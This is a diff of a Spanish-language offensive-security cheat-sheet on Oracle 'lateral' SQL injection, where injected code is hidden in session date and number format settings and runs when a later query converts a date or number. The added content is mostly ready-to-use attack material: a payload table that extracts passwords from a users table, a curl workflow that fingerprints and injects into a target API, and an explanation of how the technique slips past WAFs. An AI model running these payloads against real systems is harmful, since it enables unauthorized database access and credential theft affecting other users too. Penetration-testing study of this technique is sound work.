@@ -1,40 +1,85 @@
 ---
 aliases:
-  - "Lateral SQL Injection"
+  - Lateral SQL Injection
 tags:
   - type/technique
   - vuln/sqli
   - technique/execution
   - asset/database
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[SQL Injection (SQLi)]]"
+  - '[[SQL Injection (SQLi)]]'
 ---
-# SQLi - Lateral
+# SQLi - Lateral (Oracle)
 
 ***
 
 ## Cheatsheet
 
-|   **Vector de Explotación**    |      **Parámetro / Entorno**      |                     **Payload Estructural (Ejemplo Oracle)**                     |                                                                                    **Contexto y Mecánica de Ejecución**                                                                                    |
-|:------------------------------:|:---------------------------------:|:--------------------------------------------------------------------------------:|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
-|   <br>Manipulación de Sesión   |       <br>`NLS_DATE_FORMAT`       |           <br>`ALTER SESSION SET NLS_DATE_FORMAT = '"'' AND 1=1--"';`            |    <br>Modifico variables de entorno de la base de datos a nivel de sesión. Cuando el aplicativo invoca `SYSDATE` o realiza conversiones implícitas, el formato inyectado detona la carga útil.<br><br>    |
-|  <br>Conversiones Implícitas   |    <br>Tipos `DATE` o `NUMBER`    | <br>`SELECT TO_CHAR(SYSDATE) FROM dual;` (Bajo el contexto alterado previamente) |            <br>Evade las sanitizaciones tradicionales. El aplicativo confía ciegamente en que las variables tipadas rígidamente (fechas o números) no pueden contener código malicioso.<br><br>            |
-| <br>Procedimientos Almacenados |  <br>Parámetros `OUT` o `IN OUT`  |   <br>Inyección anidada dentro de variables de retorno esperadas como fechas.    |              <br>Aprovecha paquetes PL/SQL vulnerables que construyen SQL dinámico (ej. `EXECUTE IMMEDIATE`) concatenando variables locales que heredan formatos de sesión corruptos.<br><br>              |
-|  <br>Truncamiento de Cadenas   | <br>Límites de `VARCHAR` / `CHAR` |                   <br><br>`A` x 4000 caracteres + `' OR 1=1--`                   | <br>Fuerza el desbordamiento o truncamiento lógico en variables temporales internas, provocando que se eliminen comillas de cierre dinámicas y el payload adjunto escape al contexto de ejecución.<br><br> |
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `ALTER SESSION SET NLS_DATE_FORMAT = '"'' AND 1=1--"'` | Modifica formato date a nivel session — payload latente | Pre-paso para envenenar `TO_CHAR(SYSDATE)`. |
+| `ALTER SESSION SET NLS_DATE_FORMAT = '"'' UNION SELECT password FROM users--"'` | Payload UNION embebido en formato date | Una vez seteado, cualquier conversion DATE→string dispara. |
+| `SELECT TO_CHAR(SYSDATE) FROM dual` (después de ALTER SESSION) | Detonator — al concatenar fecha, ejecuta el formato envenenado | Hay endpoint que llama `TO_CHAR` con session reusada. |
+| `ALTER SESSION SET NLS_NUMERIC_CHARACTERS = '''' OR ''1''=''1''-- '` | Vector via formato numérico (NUMBER conversions) | App con queries que castean a/desde NUMBER. |
+| `BEGIN SYS.LT.CREATEWORKSPACE('x'' AND 1=1--'); END;` | PL/SQL package vulnerable con SQL dinámico interno | Apps con SYS.LT (workspace mgmt) accesible. |
+| Username `A` x 4000 + `' OR 1=1-- -` (truncamiento) | Buffer overflow lógico — comilla cierre original se trunca | App con VARCHAR2(4000) y concat sin sanitizar. |
+| `BEGIN DBMS_OUTPUT.PUT_LINE((SELECT password FROM users WHERE rownum=1)); END;` | Output via DBMS_OUTPUT capturado en logs | Endpoint que lee buffer DBMS_OUTPUT después. |
 ^sqli-lateral
+
+### Workflow
+
+```bash
+TARGET="https://target/api/items?id=1"
+
+# 1. Confirmar backend Oracle
+curl -s "$TARGET" | grep -iE 'ora-|oracle'
+curl -s "$TARGET'" | grep -oE 'ORA-[0-9]+'
+
+# 2. Setear NLS_DATE_FORMAT envenenado
+PAYLOAD_1="'; BEGIN EXECUTE IMMEDIATE 'ALTER SESSION SET NLS_DATE_FORMAT = ''\"'''' UNION SELECT password,user FROM users--\"''' ; END;-- -"
+curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD_1'))")"
+
+# 3. Triggerear endpoint que use TO_CHAR(SYSDATE)
+# Ejemplos: /api/reports, /admin/audit, /search?date=today
+curl -s "https://target/api/reports"  # debería reflejar el password ahora
+```
+
+### Por qué bypassa WAFs
+
+```sql
+-- WAF inspecciona la PRIMERA query — solo ve un ALTER SESSION:
+ALTER SESSION SET NLS_DATE_FORMAT = '"'' AND 1=1--"'
+-- WAF: "no es SELECT/UPDATE/INSERT, es config — allow"
+
+-- DESPUÉS, endpoint legítimo hace:
+SELECT TO_CHAR(SYSDATE) FROM dual
+-- Oracle ahora interpreta SYSDATE usando el formato envenenado
+-- → ejecuta el ' AND 1=1-- como código SQL en el contexto
+```
 
 ___
 
 ## Overview
 
-El [[Lateral SQL Injection]] es un vector de ataque avanzado, documentado principalmente en entornos [[Oracle]], que rompe el paradigma clásico de la inyección de cadenas de texto. En lugar de atacar directamente los campos de entrada de la aplicación, mi objetivo es envenenar el entorno de ejecución de la sesión de la base de datos o explotar tipos de datos considerados "seguros", como `DATE` o `NUMBER`.
+**Lateral SQLi** = vector Oracle-específico. En vez de inyectar en input string típico, envenenar **variables de sesión de Oracle** (`NLS_DATE_FORMAT`, `NLS_NUMERIC_CHARACTERS`). Cualquier conversion implícita o explícita posterior dispara el payload.
 
-Al alterar dinámicamente parámetros de configuración globales de mi sesión (por ejemplo, el formato de fecha mediante `ALTER SESSION`), provoco que cualquier conversión posterior realizada por el sistema (como un `TO_CHAR(SYSDATE)`) concatene e interprete mi código malicioso oculto en el esquema de formato. Esto me permite evadir los WAFs y los filtros de validación de entrada, ya que la aplicación web asume erróneamente que los datos que no son de tipo `VARCHAR` son inherentemente inmunes a la inyección.
+**Por qué es lateral:**
+- Inyección no ocurre en la query atacada inicialmente.
+- Payload "espera" en la session config.
+- Detonator es otra query que aparenta ser segura (`TO_CHAR(SYSDATE)`).
 
+**Bypassa:**
+- WAFs que buscan patrones SQLi en queries normales.
+- Validaciones de tipos rígidos (DATE/NUMBER) que asumen inmunidad.
+- Sanitization de strings (el payload va en SET de config).
+
+**Limitación:** session debe persistir entre primera query (poison) y segunda (detonator). Connection pooling con sessions persistentes amplifica esto — un atacante envenena, **otros usuarios** disparan.
+
+Documentado por David Litchfield (2008) — más teórico que común, pero severo cuando aplica.
 
 ***
